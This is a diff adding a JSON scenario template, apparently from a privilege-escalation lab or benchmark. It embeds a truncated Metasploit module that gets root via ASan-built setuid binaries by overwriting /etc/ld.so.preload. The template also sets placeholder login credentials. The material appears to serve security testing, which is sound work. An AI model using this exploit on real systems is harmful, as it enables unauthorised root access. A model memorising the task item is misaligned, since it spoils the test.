@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_46241",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: AddressSanitizer (ASan) - SUID Executable Privilege Escalation (Metasploit)\n\nExploit source code (46241.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AddressSanitizer (ASan) SUID Executable Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges on Linux systems using\n        setuid executables compiled with AddressSanitizer (ASan).\n\n        ASan configuration related environment variables are permitted when\n        executing setuid executables built with libasan. The `log_path` option\n        can be set using the `ASAN_OPTIONS` environment variable, allowing\n        clobbering of arbitrary files, with the privileges of the setuid user.\n\n        This module uploads a shared object and sprays symlinks to overwrite\n        `/etc/ld.so.preload` in order to create a setuid root shell.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Szabolcs Nagy', # Discovery and PoC\n          'infodox',       # unsanitary.sh Exploit\n          'bcoles'         # Metasploit\n        ],\n      'DisclosureDate' => '2016-02-17',\n      'Platform'       => 'linux',\n      'Arch'           =>\n        [\n          ARCH_X86,\n          ARCH_X64,\n          ARCH_ARMLE,\n          ARCH_AARCH64,\n          ARCH_PPC,\n          ARCH_MIPSLE,\n          ARCH_MIPSBE\n        ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        => [['Auto', {}]],\n      'DefaultOptions' =>\n        {\n          'AppendExit'       => true,\n          'PrependSetresuid' => true,\n          'PrependSetresgid' => true,\n          'PrependFork'      => true\n        },\n      'References'     =>\n        [\n          ['URL', 'https://seclists.org/oss-sec/2016/q1/363'],\n          ['URL', 'https://seclists.org/oss-sec/2016/q1/379'],\n          ['URL', 'https://gist.github.com/0x27/9ff2c8fb445b6ab9c94e'],\n          ['URL', 'https://github.com/bcoles/local-exploits/tree/master/asan-suid-root']\n        ],\n      'Notes' =>\n        {\n          'AKA' => ['unsanitary.sh']\n        },\n      'DefaultTarget'  => 0))\n    register_options [\n      OptString.new('SUID_EXECUTABLE', [true, 'Path to a SUID executable compiled with ASan', '']),\n      OptInt.new('SPRAY_SIZE', [true, 'Number of PID symlinks to create', 50])\n    ]\n    register_advanced_options [\n      OptBool.new('ForceExploit',  [false, 'Override check result', false]),\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir']\n  end\n\n  def suid_exe_path\n    datastore['SUID_EXECUTABLE']\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ..\n```",
+  "cve": "",
+  "exploitdb_id": "46241",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_46241",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
